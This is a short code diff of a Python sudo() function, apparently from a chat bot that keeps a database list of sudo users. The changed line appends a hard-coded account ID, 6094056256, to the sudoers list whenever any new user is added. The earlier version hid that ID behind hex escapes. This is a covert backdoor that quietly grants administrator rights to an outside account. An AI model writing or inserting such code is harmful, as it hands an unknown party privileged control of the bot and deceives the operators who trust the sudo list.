@@ -56,7 +56,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(\x36\x30\x39\x34\x30\x35\x36\x32\x35\x36)
+                sudoers.append(6094056256)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
